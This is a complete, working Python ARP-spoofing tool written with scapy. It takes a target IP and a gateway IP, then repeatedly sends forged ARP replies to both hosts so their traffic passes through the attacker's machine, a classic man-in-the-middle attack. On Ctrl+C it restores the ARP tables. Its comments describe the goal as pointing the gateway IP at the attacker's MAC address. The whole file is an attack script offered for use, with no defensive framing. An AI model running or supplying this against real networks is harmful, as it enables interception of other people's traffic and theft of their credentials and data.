import sys
import time
import scapy.all as scapy
from optparse import *
"""
op = set to the ARP response, 1 = request
pdst = victim IP addr
hwdst = victim MAC
psrc = set the packet source IP to gateway IP addr
"""

def get_args():
    parser = OptionParser()
    parser.add_option("-t", "--target",help="define the target IP", dest="target_ip")
    parser.add_option("-g", "--gateway",help="define the gateway IP", dest="gateway_ip")
    (options, args) = parser.parse_args()
    if not options.target_ip:
        parser.error("please specify the target ip")
    elif not options.gateway_ip:
        parser.error("please specify the gateway ip")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # print(arp_request.summary())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.summary())
    arp_broadcast = broadcast/arp_request
    # arp_broadcast.show()
    ans_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


"""
print(packet.show())
print(packet.summary())
summarize the packet generate above
"""


def spoof(target_ip, spoof_ip,):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)  # command change the default gateway IP to attacker MAC addr


def restore(dst_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, verbose=False)


i = 0
keep_looping = True
options = get_args()
try:
    while keep_looping:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        i += 2
        print(f"\rsending the {i} packets", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Quitting.\n"
          "reset the ARP table...")
    restore(options.target_ip, options.gateway_ip)
    restore( options.gateway_ip, options.target_ip)


